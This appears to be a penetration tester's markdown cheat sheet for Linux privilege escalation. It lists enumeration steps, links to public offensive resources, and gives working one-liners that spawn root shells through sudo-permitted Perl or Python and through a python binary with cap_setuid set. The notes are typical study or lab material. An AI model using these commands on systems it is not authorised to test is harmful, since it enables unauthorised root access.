## Linux Privilege Escalation

Go here if you run out of ideas:  https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

### User Permissions

1. See if user has sudo permissions (you may need the user's password to use it though)

   ```bash
   sudo -l
   ```

2. If a user has sudo permissions to scripts (Perl, Python, etc), use those with sudo to spawn a shell as root.

   ```bash
   # Perl
   sudo perl -e 'exec "/bin/bash -i"'
   # Python
   sudo python -c 'import pty; pty.spawn("/bin/bash")'
   ```

### Cron Jobs

1. Check cron jobs for any binaries that can be written to or scripts that can be exploited

### Capabilities for Files

```bash
# Check for files with capabilities set
getcap -r / 2>/dev/null
# Set capability for file
setcap CAPABILITY+ep /path/filename
```

Example:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**<u>Empty Capabilities</u>**

 if you have a binary that:

1. is not owned by root
2. has no `SUID`/`SGID` bits set
3. has empty capabilities set (e.g.: `getcap myelf` returns `myelf =ep`)

then that binary will run as root.

### Binary Path

Check the path and see if a writeable folder supersedes one of the bin folders.  If a script calls a binary without specifying the path and runs as root, you can override the binary with your own script.

### Exploitable Binaries

1. Check out any unusual SUID binaries from the initial scans

2. Be sure to closely examine the /usr/* binaries, as user defined programs are supposed to end up here.

3. Either cat custom binaries or use ltrace to examine them:

   ```bash
   ltrace BIN_NAME
   ```

4. Check this page for binaries that can be used to break out restricted shells, escalate or maintain elevated privileges,  transfer files, spawn bind and reverse shells, and facilitate the other  post-exploitation tasks:  https://gtfobins.github.io/

### Kernel Exploits

1. Find the current Linux and Kernel version and look for Kernel Exploits

   ```bash
   # Linux Ver
   cat /etc/*release
   # Kernel Ver
   uname -a   
   ```

### LXD Containers

If a user is a member of the `lxd` group, follow this to escalate privileges:

https://reboare.github.io/lxd/lxd-escape.html

### Wildcard Exploits (Wildcard Wildness)

Some commands can have their options hijacked using filenames that match those options.  See this page for more info:

https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

### Commands to Try:

https://book.hacktricks.xyz/linux-unix/privilege-escalation/payloads-to-execute



